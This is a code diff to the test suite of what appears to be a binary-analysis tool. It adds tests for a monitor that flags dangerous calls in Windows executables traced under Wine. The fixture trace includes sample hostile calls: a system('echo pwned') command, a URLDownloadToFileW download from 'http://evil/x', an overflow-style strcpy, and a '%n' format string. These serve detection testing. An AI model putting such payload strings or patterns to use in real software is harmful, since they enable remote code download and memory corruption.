@@ -215,15 +215,55 @@ class _FakeCtx:
     def progress(self, pct=None, msg=None): pass
 
 
-def test_monitor_rejects_non_elf(store, case):
-    """A Windows PE / macOS Mach-O can't be run under host GDB or qemu-user here, so the monitor
-    must reject it with a clear note rather than silently returning zero calls."""
+def test_monitor_rejects_unsupported_format(store, case):
+    """ELF runs under GDB/qemu and PE under Wine; a macOS Mach-O has no substrate here, so the
+    monitor rejects it with a clear note rather than silently returning zero calls."""
     from lykos.analyze.debug.monitor_stage import monitor_stage
-    t = store.targets.upsert(case.id, "vuln.exe", "cd" * 32, size=10)
-    store.targets.update_triage(t.id, file_type="pe", arch=None, bits=None, endianness=None,
+    t = store.targets.upsert(case.id, "vuln.macho", "cd" * 32, size=10)
+    store.targets.update_triage(t.id, file_type="macho", arch=None, bits=None, endianness=None,
                                 linking=None, stripped=None, mitigations=None, entropy=0.0)
-    ctx = _FakeCtx(store.conn, t.id, {"argv": ["4242"], "sink_addrs": {"system": "0x1400"}})
+    ctx = _FakeCtx(store.conn, t.id, {"argv": ["4242"]})
     monitor_stage(ctx)
     done = [p for k, p in ctx.events if k == "monitor.done"]
     assert done and done[0]["ok"] is False
-    assert "ELF" in done[0]["note"] and "PE" in done[0]["note"]
+    assert "MACHO" in done[0]["note"].upper()
+
+
+# --- Windows PE dangerous-call monitor (Wine +relay) ----------------------------------------
+from lykos.analyze.debug import winmonitor  # noqa: E402
+
+_WIN_RELAY = (
+    '0100:trace:module:map_image_into_view mapping PE file L"v.exe" at 0x140000000-0x140041000\n'
+    '0100:Call msvcrt.system(14000a01f "echo pwned") ret=140008caf\n'         # exec -> kept
+    '0100:Call msvcrt.strcpy(0063,14000 "AAAA") ret=140008d00\n'              # copy -> kept
+    '0200:Call msvcrt.system(0 "svc") ret=140002000\n'                        # other thread -> drop
+    '0100:Call KERNEL32.CreateProcessW(0,0,0) ret=6fffaaaa\n'                 # ret in DLL -> drop
+    '0100:Call KERNEL32.CreateProcessW(0,L"C:\\\\windows\\\\services.exe",0) ret=140008e00\n'
+    '0100:Call urlmon.URLDownloadToFileW(0,L"http://evil/x",0,0,0) ret=140008f00\n'  # download
+    '0100:Call user32.wsprintfW(0,L"%s%n",0) ret=140009000\n'                 # format string
+)
+
+
+def test_winmonitor_parse_captures_sink_args():
+    ev = winmonitor.parse(_WIN_RELAY, "0100", 0x140000000, 0x140041000)
+    by = {}
+    for e in ev:
+        by.setdefault(e["kind"], []).append(e)
+    assert any(e["value"] == "echo pwned" for e in by["exec"])          # target's system()
+    assert not any(e["value"] == "svc" for e in by.get("exec", []))     # other-thread excluded
+    assert any(e["value"] == "AAAA" and e["length"] == 4 for e in by["copy"])
+    assert any(e["value"] == "http://evil/x" for e in by["download"])
+    assert any("%n" in e["value"] for e in by["format"])
+    # the Wine services.exe helper CreateProcessW is dropped; the DLL-internal one (ret out of
+    # range) is dropped too
+    assert all("services.exe" not in (e.get("value") or "") for e in ev)
+
+
+@pytest.mark.skipif(not os.path.exists(os.path.join(_CORPUS, "vuln_win64.exe"))
+                    or not winmonitor.supported(),
+                    reason="needs the win64 corpus PE and wine")
+def test_winmonitor_live_captures_command():
+    r = winmonitor.monitor(os.path.join(_CORPUS, "vuln_win64.exe"), argv=["4242"], timeout=90)
+    assert r["ok"], r.get("note")
+    execs = [h for h in r["hits"] if h["kind"] == "exec"]
+    assert any(h["value"] == "echo unlocked" for h in execs)
